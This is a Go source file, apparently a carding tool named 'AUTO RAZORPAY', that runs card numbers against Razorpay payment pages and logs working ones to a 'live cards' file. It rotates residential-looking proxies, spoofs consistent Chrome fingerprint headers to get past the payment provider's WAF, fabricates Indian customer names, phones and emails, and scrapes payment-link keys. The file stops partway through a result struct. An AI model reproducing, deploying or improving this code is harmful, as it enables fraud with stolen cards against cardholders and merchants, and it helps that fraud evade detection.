package main

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"context"
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math"
	"math/big"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
//  Modified for Railway.app + sites.txt support + WAF Bypass v4 (DEEP FIXED)
// ────────────────────────────────────────────────────────────────────────

const (
	BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
	BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
	PORT     = 7070
)

// parsedProxy holds the raw string + pre-parsed *url.URL
type parsedProxy struct {
	raw    string
	parsed *url.URL
}

var (
	razorpayURLs []string
	urlIndex     uint64
	proxyIndex   uint64

	globalProxyList []parsedProxy

	// High-load protection
	maxConcurrentChecks = 120
	checkSemaphore      = make(chan struct{}, maxConcurrentChecks)

	// Safe concurrent writes to live.txt
	liveLogMutex sync.Mutex

	// Path to the live-cards log file. Settable via LIVE_FILE env var so
	// deployments can point it at a mounted volume without recompiling.
	liveFilePath = "live.txt"
)

func getNextURL() string {
	if len(razorpayURLs) == 0 {
		return "https://pages.razorpay.com/lckuk-international"
	}
	idx := atomic.AddUint64(&urlIndex, 1) - 1
	return razorpayURLs[idx%uint64(len(razorpayURLs))]
}

const proxyScheme = "http"

func formatProxy(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.Contains(raw, "://") {
		return raw
	}
	parts := strings.Split(raw, ":")
	if len(parts) == 4 {
		host := parts[0]
		port := parts[1]
		user := url.QueryEscape(parts[2])
		pass := url.QueryEscape(parts[3])
		return fmt.Sprintf("%s://%s:%s@%s:%s", proxyScheme, user, pass, host, port)
	}
	return proxyScheme + "://" + raw
}

// loadProxies reads the proxy file and returns parsed entries.
// Errors are logged but not propagated: a missing/empty px.txt simply means
// "no proxies" (DIRECT mode), which is a legitimate operating mode.
func loadProxies(filepath string) []parsedProxy {
	var proxies []parsedProxy
	data, err := os.ReadFile(filepath)
	if err != nil {
		if !os.IsNotExist(err) {
			log.Printf("loadProxies: failed to read %s: %v", filepath, err)
		}
		return proxies
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		formatted := formatProxy(line)
		if formatted == "" {
			continue
		}
		pURL, err := url.Parse(formatted)
		if err != nil {
			log.Printf("loadProxies: skipping invalid proxy %q: %v", line, err)
			continue
		}
		proxies = append(proxies, parsedProxy{raw: formatted, parsed: pURL})
	}
	return proxies
}

// extractProxyHost extracts the bare hostname from a proxy URL string.
// Order matters: strip credentials first, then scheme, then port, so that
// `http://user:pass@host:8080` reliably becomes `host`.
func extractProxyHost(raw string) string {
	host := raw

	// Strip credentials (everything before '@') FIRST — a password may
	// legitimately contain ':' or '//' sequences that would otherwise
	// confuse the scheme/port detection below.
	if idx := strings.LastIndex(host, "@"); idx != -1 {
		host = host[idx+1:]
	}

	// Remove scheme
	if idx := strings.Index(host, "://"); idx != -1 {
		host = host[idx+3:]
	}

	// Remove port (only if a host remains)
	if idx := strings.Index(host, ":"); idx != -1 {
		host = host[:idx]
	}

	// Remove any leftover path/query
	if idx := strings.IndexAny(host, "/?"); idx != -1 {
		host = host[:idx]
	}

	return strings.ToLower(strings.TrimSpace(host))
}

// torOrBadHosts lists substrings that strongly indicate the proxy is on a
// known Tor / datacenter / VPN host. Substring matching is intentional so
// `pl-tor.pvdata.host`, `tor-exit.anonymizer.com`, etc. are all caught.
//
// Keep the entries narrow — bare substrings like "aws" or "vps" would
// false-positive on legitimate residential hostnames that happen to contain
// those letters, so we keep them anchored with separators where needed.
var torOrBadHosts = []string{
	"tor", "pl-tor", "exit", "relay",
	"datacenter", ".aws", "azure", "gcp",
	"linode", "digitalocean", "vultr",
	"hetzner", "ovh", "contabo", "vps",
	"proxy", "vpn", "res-", "res.",
	"socks", "tunnel", "anonym",
}

func isBadProxyHost(raw string) bool {
	host := extractProxyHost(raw)
	if host == "" {
		return true
	}
	for _, bad := range torOrBadHosts {
		if strings.Contains(host, bad) {
			return true
		}
	}
	return false
}

// getNextProxy returns a pointer to a proxy from the shared list, skipping
// hosts that look like Tor / datacenter / VPN endpoints.
//
// IMPORTANT: callers must NOT keep a pointer to the slice element across
// goroutines — we return a *copy* of the parsedProxy struct so each caller
// owns its own value and there is no shared mutable state.
func getNextProxy(proxyList []parsedProxy) *parsedProxy {
	if len(proxyList) == 0 {
		return nil
	}

	// Scan at most len(proxyList) entries. If every proxy in the list is
	// bad, scanning more rounds would just burn CPU — fall through to the
	// "any proxy" fallback below.
	maxAttempts := len(proxyList)

	for attempt := 0; attempt < maxAttempts; attempt++ {
		idx := atomic.AddUint64(&proxyIndex, 1) - 1
		p := proxyList[idx%uint64(len(proxyList))]
		if !isBadProxyHost(p.raw) {
			return &p
		}
	}

	log.Printf("WARNING: every proxy in the list matched a bad-host pattern; falling back to a random proxy")
	idx := atomic.AddUint64(&proxyIndex, 1) - 1
	p := proxyList[idx%uint64(len(proxyList))]
	return &p
}

func loadSites(filepath string) []string {
	var sites []string
	data, err := os.ReadFile(filepath)
	if err != nil {
		return sites
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.HasPrefix(line, "http://") || strings.HasPrefix(line, "https://") {
			sites = append(sites, line)
		}
	}
	return sites
}

// randInt returns a uniformly random integer in the inclusive range [min, max].
// If the crypto/rand source fails (extremely unlikely) the function falls back
// to min so the caller still gets a value in range rather than panicking.
func randInt(min, max int) int {
	if max < min {
		min, max = max, min
	}
	span := int64(max - min + 1)
	if span <= 0 {
		return min
	}
	n, err := rand.Int(rand.Reader, big.NewInt(span))
	if err != nil {
		return min
	}
	return int(n.Int64()) + min
}

// genUA returns a random Chrome User-Agent string. checkCard uses this to
// generate a UA, then passes it to NewCustomFetch which derives a MATCHING
// Sec-CH-UA from the same Chrome major (see parseChromeMajor).
func genUA() string {
	major := randInt(120, 147)
	build := randInt(5000, 6999)
	patch := randInt(50, 249)
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", major, build, patch)
}

// genSecChUA is retained for any future caller that needs a standalone
// Sec-CH-UA string. The main flow uses CustomFetch.secChUA instead, which is
// derived from the same Chrome major as the User-Agent.
func genSecChUA() string {
	major := randInt(120, 147)
	return fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, major, major)
}

var _ = genSecChUA // retained for future standalone use

func genIndianPhone() string {
	first := []string{"6", "7", "8", "9"}[randInt(0, 3)]
	rest := ""
	for i := 0; i < 9; i++ {
		rest += strconv.Itoa(randInt(0, 9))
	}
	return "+91" + first + rest
}

func genEmail() string {
	names := []string{"alex", "john", "mike", "sara", "david", "emma", "james", "lisa", "chris", "anna", "raj", "priya", "vikram", "ananya", "rohit", "neha"}
	domains := []string{"gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"}
	return names[randInt(0, len(names)-1)] + strconv.Itoa(randInt(100, 9999)) + "@" + domains[randInt(0, len(domains)-1)]
}

func genName() string {
	names := []string{"Alex Kumar", "John Sharma", "Mike Patel", "Sara Gupta", "David Singh", "Emma Reddy", "James Nair", "Lisa Iyer", "Chris Rao", "Anna Mehta", "Raj Verma", "Priya Joshi", "Vikram Desai", "Ananya Nair", "Rohit Singh", "Neha Kapoor"}
	return names[randInt(0, len(names)-1)]
}

func getBrand(cc string) string {
	if strings.HasPrefix(cc, "4") {
		return "visa"
	}
	if len(cc) >= 2 {
		switch cc[:2] {
		case "51", "52", "53", "54", "55":
			return "mastercard"
		case "34", "37":
			return "amex"
		}
	}
	if strings.HasPrefix(cc, "6011") || strings.HasPrefix(cc, "65") {
		return "discover"
	}
	return "unknown"
}

func findBetween(content, start, end string) string {
	si := strings.Index(content, start)
	if si == -1 {
		return ""
	}
	si += len(start)
	ei := strings.Index(content[si:], end)
	if ei == -1 {
		return ""
	}
	return content[si : si+ei]
}

func extractJSONVar(content, varName string) string {
	prefix := "var " + varName + " ="
	startIdx := strings.Index(content, prefix)
	if startIdx == -1 {
		return ""
	}
	startIdx += len(prefix)

	for startIdx < len(content) {
		c := content[startIdx]
		if c != ' ' && c != '\t' && c != '\n' && c != '\r' {
			break
		}
		startIdx++
	}

	if startIdx >= len(content) || content[startIdx] != '{' {
		return ""
	}

	depth := 0
	inString := false
	escaped := false

	for i := startIdx; i < len(content); i++ {
		c := content[i]

		if escaped {
			escaped = false
			continue
		}
		if c == '\\' && inString {
			escaped = true
			continue
		}
		if c == '"' {
			inString = !inString
			continue
		}
		if inString {
			continue
		}
		if c == '{' {
			depth++
		} else if c == '}' {
			depth--
			if depth == 0 {
				return content[startIdx : i+1]
			}
		}
	}
	return ""
}

func generateRzpDeviceID() (string, string) {
	buf := make([]byte, 16)
	// crypto/rand.Read can return an error; on Linux it almost never does,
	// but ignoring it would let a zeroed buffer produce a deterministic
	// device ID. Fall back to time-seeded randomness instead.
	if _, err := rand.Read(buf); err != nil {
		for i := range buf {
			buf[i] = byte(randInt(0, 255))
		}
	}
	h := sha1.Sum(buf)
	hStr := hex.EncodeToString(h[:])
	ts := strconv.FormatInt(time.Now().UnixMilli(), 10)
	rnd := fmt.Sprintf("%08d", randInt(0, 99999999))
	return fmt.Sprintf("1.%s.%s.%s", hStr, ts, rnd), hStr
}

func generateRzpSessionID() string {
	const base62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	buf := make([]byte, 14)
	for i := 0; i < 14; i++ {
		n, err := rand.Int(rand.Reader, big.NewInt(62))
		if err != nil {
			n = big.NewInt(int64(randInt(0, 61)))
		}
		buf[i] = base62[n.Int64()]
	}
	return string(buf)
}

// FIX 4: Shuffle form values for realistic submission
func shuffleFormValues(v url.Values) url.Values {
	type kv struct {
		key   string
		value []string
	}
	var items []kv
	for k := range v {
		items = append(items, kv{k, v[k]})
	}

	// Fisher-Yates shuffle
	for i := len(items) - 1; i > 0; i-- {
		j := randInt(0, i)
		items[i], items[j] = items[j], items[i]
	}

	result := url.Values{}
	for _, item := range items {
		result[item.key] = item.value
	}
	return result
}

// resolveRazorpayInitData handles both page types:
//  1. pages.razorpay.com  — classic static page with "var data = {...}"
//  2. razorpay.me/@slug   — redirects to payment_link; fetch data via API
func resolveRazorpayInitData(fetch *CustomFetch, targetURL string, proxyRaw string) (map[string]interface{}, string, error) {
	// For razorpay.me URLs we need to follow the redirect and then call the API
	isRzpMe := strings.Contains(targetURL, "razorpay.me/")

	if isRzpMe {
		// Step A: Follow redirect to get final URL (may redirect to pages.razorpay.com or stay at razorpay.me)
		resp, err := fetch.Get(targetURL, map[string]string{
			"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language":           generateAcceptLanguage(),
			"Sec-Fetch-Dest":            "document",
			"Sec-Fetch-Mode":            "navigate",
			"Sec-Fetch-Site":            "none",
			"Sec-Fetch-User":            "?1",
			"Upgrade-Insecure-Requests": "1",
		})
		if err != nil {
			// Distinguish between a real proxy/network error and
			// an HTTP-status error that Go wrapped into *url.Error
			// (e.g. paid proxy returning 402 "Payment Required"
			// when the user's quota is exhausted).
			if code := extractHTTPStatusFromErr(err.Error()); code > 0 {
				desc, proxyStatus := classifyHTTPError(code)
				return nil, proxyStatus, fmt.Errorf("%s: %v", desc, err)
			}
			return nil, "", err
		}
		// Handle ALL non-2xx responses, not just 403/429. Razorpay
		// can return:
		//   402 — payment link expired / inactive
		//   404 — payment link not found
		//   5xx — Razorpay server error
		// and the proxy itself can return 402/407/5xx.
		if resp.StatusCode == 403 || resp.StatusCode == 429 {
			return nil, "BLOCKED", fmt.Errorf("WAF Blocked on page load (HTTP %d)", resp.StatusCode)
		}
		if resp.StatusCode == 402 {
			// Could be the proxy (quota exhausted) OR Razorpay
			// (link expired). Since the proxy is the more common
			// culprit, classify as DEAD.
			return nil, "DEAD", fmt.Errorf("HTTP 402 Payment Required on page load (proxy quota exhausted or link expired)")
		}
		if resp.StatusCode == 404 {
			return nil, "LIVE", fmt.Errorf("Payment link not found (HTTP 404) — link may be deleted or never existed")
		}
		if resp.StatusCode == 407 {
			return nil, "DEAD", fmt.Errorf("Proxy authentication failed (HTTP 407)")
		}
		if resp.StatusCode >= 500 {
			return nil, "LIVE", fmt.Errorf("Razorpay server error on page load (HTTP %d) — try again later", resp.StatusCode)
		}

		pageHTML := resp.Text()
		finalURL := targetURL

		// Try to get the final URL from page content (Location or canonical)
		if loc := findBetween(pageHTML, `<link rel="canonical" href="`, `"`); loc != "" {
			finalURL = loc
		}

		// Try extracting slug — razorpay.me/@slug or razorpay.me/slug
		slug := ""
		if idx := strings.Index(targetURL, "razorpay.me/"); idx != -1 {
			rest := targetURL[idx+len("razorpay.me/"):]
			rest = strings.TrimPrefix(rest, "@")
			rest = strings.Split(rest, "?")[0]
			rest = strings.Split(rest, "#")[0]
			slug = strings.TrimSpace(rest)
		}

		// Strategy A: try fetching init data from Razorpay's internal page-data API
		if slug != "" {
			apiURL := fmt.Sprintf("https://api.razorpay.com/v1/payment_links/%s?expand[]=payment_page_items", slug)
			apiResp, apiErr := fetch.Get(apiURL, map[string]string{
				"Accept":         "application/json, text/plain, */*",
				"Origin":         "https://razorpay.me",
				"Referer":        targetURL,
				"Sec-Fetch-Dest": "empty",
				"Sec-Fetch-Mode": "cors",
				"Sec-Fetch-Site": "cross-site",
			})
			if apiErr == nil && apiResp.StatusCode == 200 {
				var apiData map[string]interface{}
				if json.Unmarshal([]byte(apiResp.Text()), &apiData) == nil {
					if _, hasID := apiData["id"]; hasID {
						// Build initData compatible with the rest of the flow
						initData := buildInitDataFromLinkAPI(apiData, pageHTML)
						if initData != nil {
							return initData, finalURL, nil
						}
					}
				}
			}
		}

		// Strategy B: try extracting from HTML (some razorpay.me pages do SSR)
		pageData := tryExtractFromHTML(pageHTML)
		if pageData != nil {
			return pageData, finalURL, nil
		}

		return nil, "", fmt.Errorf("Could not extract Razorpay data from razorpay.me page (slug: %s)", slug)
	}

	// Standard pages.razorpay.com flow
	resp, err := fetch.Get(targetURL, map[string]string{
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language":           generateAcceptLanguage(),
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-User":            "?1",
		"Upgrade-Insecure-Requests": "1",
	})
	if err != nil {
		if code := extractHTTPStatusFromErr(err.Error()); code > 0 {
			desc, proxyStatus := classifyHTTPError(code)
			return nil, proxyStatus, fmt.Errorf("%s: %v", desc, err)
		}
		return nil, "", err
	}
	if resp.StatusCode == 403 || resp.StatusCode == 429 || strings.Contains(resp.Text(), "Forbidden") {
		return nil, "BLOCKED", fmt.Errorf("WAF Blocked on page load (HTTP %d)", resp.StatusCode)
	}
	if resp.StatusCode == 402 {
		return nil, "DEAD", fmt.Errorf("HTTP 402 Payment Required on page load (proxy quota exhausted or link expired)")
	}
	if resp.StatusCode == 404 {
		return nil, "LIVE", fmt.Errorf("Payment page not found (HTTP 404)")
	}
	if resp.StatusCode == 407 {
		return nil, "DEAD", fmt.Errorf("Proxy authentication failed (HTTP 407)")
	}
	if resp.StatusCode >= 500 {
		return nil, "LIVE", fmt.Errorf("Razorpay server error on page load (HTTP %d) — try again later", resp.StatusCode)
	}

	pageHTML := resp.Text()
	pageData := tryExtractFromHTML(pageHTML)
	if pageData != nil {
		return pageData, targetURL, nil
	}

	return nil, "", fmt.Errorf("Failed to locate Razorpay data on page")
}

// tryExtractFromHTML tries multiple patterns to find init data in HTML
func tryExtractFromHTML(html string) map[string]interface{} {
	patterns := []string{"data", "__INITIAL_DATA__", "__rzp_config__", "rzpConfig", "pageConfig", "checkoutData", "initialData", "__INITIAL_STATE__", "window.__data__", "rzpData", "checkoutPageConfig"}
	for _, varName := range patterns {
		jsonStr := extractJSONVar(html, varName)
		if jsonStr == "" {
			continue
		}
		var m map[string]interface{}
		if json.Unmarshal([]byte(jsonStr), &m) == nil && len(m) > 2 {
			return m
		}
		// Try double-encoded
		var inner string
		if json.Unmarshal([]byte(jsonStr), &inner) == nil {
			if json.Unmarshal([]byte(inner), &m) == nil && len(m) > 2 {
				return m
			}
		}
	}

	// Try meta tag: <meta name="rzp-data" content="{...}">
	if idx := strings.Index(html, `name="rzp-data"`); idx != -1 {
		sub := html[idx:]
		content := findBetween(sub, `content='`, `'`)
		if content == "" {
			content = findBetween(sub, `content="`, `"`)
		}
		if content != "" {
			var m map[string]interface{}
			if json.Unmarshal([]byte(content), &m) == nil {
				return m
			}
		}
	}

	// Try script tag with application/json
	scriptStart := `<script type="application/json"`
	if idx := strings.Index(html, scriptStart); idx != -1 {
		inner := html[idx:]
		jsonContent := findBetween(inner, ">", "</script>")
		if jsonContent != "" {
			var m map[string]interface{}
			if json.Unmarshal([]byte(strings.TrimSpace(jsonContent)), &m) == nil && len(m) > 2 {
				return m
			}
		}
	}

	// Try __NEXT_DATA__ (Next.js pages)
	if idx := strings.Index(html, `id="__NEXT_DATA__"`); idx != -1 {
		inner := html[idx:]
		jsonContent := findBetween(inner, ">", "</script>")
		if jsonContent != "" {
			var nextData map[string]interface{}
			if json.Unmarshal([]byte(strings.TrimSpace(jsonContent)), &nextData) == nil {
				if props, ok := nextData["props"].(map[string]interface{}); ok {
					if initialProps, ok := props["initialProps"].(map[string]interface{}); ok {
						return initialProps
					}
				}
				return nextData
			}
		}
	}

	return nil
}

// buildInitDataFromLinkAPI converts Razorpay payment_links API response
// into the initData format the rest of the flow expects
func buildInitDataFromLinkAPI(apiData map[string]interface{}, pageHTML string) map[string]interface{} {
	linkID := getStringFromMap(apiData, "id") // ppl_xxx or pl_xxx
	if linkID == "" {
		return nil
	}

	// Extract key_id from page HTML (it's usually in a script tag on razorpay.me pages)
	keyID := ""
	for _, pat := range []string{`key_id":"`, `key":"`, `"key_id": "`, `"key": "`} {
		if idx := strings.Index(pageHTML, pat); idx != -1 {
			start := idx + len(pat)
			end := strings.Index(pageHTML[start:], `"`)
			if end > 0 && end < 50 {
				candidate := pageHTML[start : start+end]
				if strings.HasPrefix(candidate, "rzp_") {
					keyID = candidate
					break
				}
			}
		}
	}

	// Build payment_link sub-object
	plObj := map[string]interface{}{
		"id": linkID,
	}

	// Extract payment_page_items if present
	if items, ok := apiData["payment_page_items"].([]interface{}); ok && len(items) > 0 {
		plObj["payment_page_items"] = items
	} else if items, ok := apiData["items"].([]interface{}); ok && len(items) > 0 {
		plObj["payment_page_items"] = items
	}

	initData := map[string]interface{}{
		"key_id":       keyID,
		"key":          keyID,
		"payment_link": plObj,
	}

	// Copy keyless_header if present
	if kh := getStringFromMap(apiData, "keyless_header"); kh != "" {
		initData["keyless_header"] = kh
	}

	return initData
}

func generateAcceptLanguage() string {
	langs := []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9",
		"en-IN,en;q=0.9,hi;q=0.8",
		"en-US,en;q=0.9,hi;q=0.8",
	}
	return langs[randInt(0, len(langs)-1)]
}

// ─── Currency conversion ───────────────────────────────────────────────────
// When a user selects a currency (e.g. USD) but the Razorpay payment link is
// locked to a different currency (e.g. INR), we convert the user's amount to
// the site's currency at the current exchange rate before charging.
//
// Uses the free Frankfurter API (no key required, based on ECB rates).
// Results are cached for 1 hour to minimize API calls.

var (
	exchangeRateCache      = make(map[string]float64) // "FROM_TO" -> rate
	exchangeRateCacheTimes = make(map[string]time.Time)
	exchangeRateCacheMutex sync.Mutex
)

// getExchangeRate returns the exchange rate from `from` currency to `to` currency.
// E.g. getExchangeRate("USD", "INR") might return 83.12 (1 USD = 83.12 INR).
// Results are cached for 1 hour. Returns an error if the API call fails.
func getExchangeRate(from, to string) (float64, error) {
	from = strings.ToUpper(strings.TrimSpace(from))
	to = strings.ToUpper(strings.TrimSpace(to))

	if from == to {
		return 1.0, nil
	}
	if from == "" || to == "" {
		return 0, fmt.Errorf("empty currency code")
	}

	cacheKey := from + "_" + to

	exchangeRateCacheMutex.Lock()
	if rate, ok := exchangeRateCache[cacheKey]; ok {
		if cacheTime, ctOk := exchangeRateCacheTimes[cacheKey]; ctOk && time.Since(cacheTime) < time.Hour {
			exchangeRateCacheMutex.Unlock()
			return rate, nil
		}
	}
	exchangeRateCacheMutex.Unlock()

	// Frankfurter API: https://api.frankfurter.app/latest?from=USD&to=INR
	// Returns: {"amount":1.0,"base":"USD","date":"2026-07-03","rates":{"INR":83.12}}
	apiURL := fmt.Sprintf("https://api.frankfurter.app/latest?from=%s&to=%s", from, to)
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		return 0, fmt.Errorf("exchange rate fetch failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return 0, fmt.Errorf("exchange rate API returned HTTP %d", resp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return 0, fmt.Errorf("exchange rate read failed: %w", err)
	}

	var data struct {
		Rates map[string]float64 `json:"rates"`
	}
	if err := json.Unmarshal(body, &data); err != nil {
		return 0, fmt.Errorf("exchange rate parse failed: %w", err)
	}

	rate, ok := data.Rates[to]
	if !ok {
		return 0, fmt.Errorf("exchange rate for %s→%s not found in response", from, to)
	}

	if rate <= 0 {
		return 0, fmt.Errorf("invalid exchange rate: %f", rate)
	}

	exchangeRateCacheMutex.Lock()
	exchangeRateCache[cacheKey] = rate
	exchangeRateCacheTimes[cacheKey] = time.Now()
	exchangeRateCacheMutex.Unlock()

	return rate, nil
}

// extractSiteCurrency searches the initData map (recursively) for a "currency"
// field. This lets us detect what currency the Razorpay payment link is
// configured for, so we can convert the user's amount if needed.
func extractSiteCurrency(initData map[string]interface{}) string {
	if initData == nil {
		return ""
	}
	return findCurrencyRecursive(initData, 0)
}

// findCurrencyRecursive searches a map for a "currency" string field, up to
// a max depth of 5 to avoid infinite recursion on cyclic structures.
func findCurrencyRecursive(m map[string]interface{}, depth int) string {
	if depth > 5 {
		return ""
	}
	// Direct key match
	if cur, ok := m["currency"].(string); ok && cur != "" {
		return strings.ToUpper(strings.TrimSpace(cur))
	}
	// Search nested maps
	for _, v := range m {
		if nested, ok := v.(map[string]interface{}); ok {
			if cur := findCurrencyRecursive(nested, depth+1); cur != "" {
				return cur
			}
		}
	}
	return ""
}

type FetchResponse struct {
	Body       string
	StatusCode int
	Headers    http.Header
}

func (r *FetchResponse) Text() string {
	return r.Body
}

type CustomFetch struct {
	client  *http.Client
	ua      string
	secChUA string
}

// NewCustomFetch builds a fetch client. The same Chrome major version is
// used for BOTH the User-Agent string and the Sec-CH-UA header — generating
// them independently (as the previous code did) produced mismatched versions
// (e.g. UA=Chrome 145, Sec-CH-UA=Chrome 121) which is a trivial WAF
// fingerprinting signal.
//
// If a non-empty `ua` is passed in, we try to parse the Chrome major out of
// it so the Sec-CH-UA header stays consistent. If parsing fails (e.g. the UA
// isn't a Chrome UA), we fall back to picking a fresh random major.
func NewCustomFetch(proxyParsedURL *url.URL, ua string) (*CustomFetch, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	transport := &http.Transport{
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:          200,
		MaxIdleConnsPerHost:   50,
		MaxConnsPerHost:       100,
		IdleConnTimeout:       90 * time.Second,
		DisableCompression:    false,
		DisableKeepAlives:     false,
		ExpectContinueTimeout: 1 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 20 * time.Second,
		Proxy:                 http.ProxyFromEnvironment,
	}
	if proxyParsedURL != nil {
		transport.Proxy = http.ProxyURL(proxyParsedURL)
	}

	client := &http.Client{
		Transport: transport,
		Jar:       jar,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return errors.New("too many redirects")
			}
			return nil
		},
	}

	// Pick ONE Chrome major for the whole life of this fetch client.
	// If the caller passed a UA, parse the major out of it so the
	// Sec-CH-UA header matches. Otherwise generate a fresh UA.
	chromeMajor := -1
	if ua != "" {
		chromeMajor = parseChromeMajor(ua)
	}
	if chromeMajor < 0 {
		chromeMajor = randInt(120, 147)
	}
	if ua == "" {
		ua = fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36",
			chromeMajor, randInt(5000, 6999), randInt(50, 249))
	}
	secChUA := fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, chromeMajor, chromeMajor)

	return &CustomFetch{client: client, ua: ua, secChUA: secChUA}, nil
}

// parseChromeMajor extracts the Chrome major version from a User-Agent
// string like "Mozilla/5.0 ... Chrome/145.0.6999.123 ...". Returns -1 if
// the version can't be found.
var chromeMajorRe = regexp.MustCompile(`Chrome/(\d+)\.`)

func parseChromeMajor(ua string) int {
	m := chromeMajorRe.FindStringSubmatch(ua)
	if len(m) < 2 {
		return -1
	}
	n, err := strconv.Atoi(m[1])
	if err != nil {
		return -1
	}
	return n
}

func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
	var reqBody io.Reader = body
	if reqBody == nil && method == "POST" {
		reqBody = strings.NewReader("")
	}

	req, err := http.NewRequest(method, targetURL, reqBody)
	if err != nil {
		return nil, err
	}

	// Always set standard browser headers first
	req.Header.Set("User-Agent", f.ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
	req.Header.Set("Accept-Language", generateAcceptLanguage())
	// NOTE: We advertise gzip+deflate (not br — Go stdlib has no brotli
	// decoder). We MUST decompress manually below because Go's Transport
	// only auto-decompresses gzip when Accept-Encoding was NOT set by the
	// caller. Setting it ourselves = our responsibility to decode.
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Sec-Ch-Ua", f.secChUA)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("DNT", "1")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := f.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	limitedBody := io.LimitReader(resp.Body, 10<<20)
	respBody, err := io.ReadAll(limitedBody)
	if err != nil {
		return nil, err
	}

	// Manually decode the body if the server used a compression we
	// advertised. Go's Transport does NOT do this when Accept-Encoding
	// was set explicitly (which it was, above).
	switch strings.ToLower(strings.TrimSpace(resp.Header.Get("Content-Encoding"))) {
	case "gzip":
		gr, gerr := gzip.NewReader(bytes.NewReader(respBody))
		if gerr != nil {
			return nil, fmt.Errorf("gzip decode: %w", gerr)
		}
		defer gr.Close()
		if decoded, derr := io.ReadAll(io.LimitReader(gr, 10<<20)); derr == nil {
			respBody = decoded
		}
	case "deflate":
		fr := flate.NewReader(bytes.NewReader(respBody))
		defer fr.Close()
		if decoded, derr := io.ReadAll(io.LimitReader(fr, 10<<20)); derr == nil {
			respBody = decoded
		}
	}

	return &FetchResponse{
		Body:       string(respBody),
		StatusCode: resp.StatusCode,
		Headers:    resp.Header,
	}, nil
}

func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
	return f.DoFetch(targetURL, "GET", headers, nil)
}

func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
	jsonBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		if _, ok2 := headers["Content-type"]; !ok2 {
			if _, ok3 := headers["content-type"]; !ok3 {
				headers["Content-Type"] = "application/json"
			}
		}
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
}

func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		if _, ok2 := headers["Content-type"]; !ok2 {
			if _, ok3 := headers["content-type"]; !ok3 {
				headers["Content-Type"] = "application/x-www-form-urlencoded"
			}
		}
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
}

type CheckResult struct {
	Status      string `json:"status"`
	Message     string `json:"response"`
	Proxy       string `json:"proxy"`
	ProxyStatus string `json:"proxy_status"`
	// Amount & Currency reflect the ACTUAL amount charged (after currency
	// conversion if the site's currency differs from what the user requested).
	// `Amount` is in MAJOR units in the site's currency (e.g. 415.00 = ₹415).
	Amount   float64 `json:"amount"`
